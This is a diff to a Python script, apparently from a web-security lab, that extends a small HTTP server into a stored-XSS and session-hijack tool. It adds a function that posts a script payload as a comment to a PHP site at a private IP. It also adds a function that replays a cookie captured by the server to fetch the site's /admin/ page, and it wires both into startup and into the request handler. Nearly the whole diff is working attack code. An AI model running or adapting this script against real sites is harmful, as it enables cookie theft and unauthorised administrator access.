@@ -4,8 +4,22 @@ from sys import argv
 from  urllib import parse
 import threading
 import time
+import  requests
 
 #use: serverth2.py port
+
+def xss_attack():
+	uri= "http://172.16.113.150/post_comment.php?id=2"
+	payload ={'title':'Confuse', 'author':'nyanyi','text':'<script>alert(6)</script>','submit':'submit'}
+	r=requests.post(uri, data=payload)
+	print("xss attack")
+	
+def get_admin(cookie_value):
+	uri_admin="http://172.16.113.150/admin/"
+	cookie_admin={'Cookie': cookie_value}
+	print(cookie_admin)
+	r = requests.get(uri_admin, headers=cookie_admin)
+	print(r.text)
 
 #Server port assignment
 port = int(argv[1])
@@ -41,14 +55,15 @@ class Handler(SimpleHTTPRequestHandler):
 			print("Bye, your cookie is", cookie)
 			# server down
 			thread2.start()
-
+			get_admin(cookie)
+		
 		SimpleHTTPRequestHandler.do_GET(self)
 
 
 #main
-
+xss_attack()
 server= TCPServer(("", port), Handler)
-print("Start")
+print("Start server")
 thread=threading.Thread(target=server.serve_forever)
 thread.start()
 thread2=threading.Thread(target=server.shutdown)
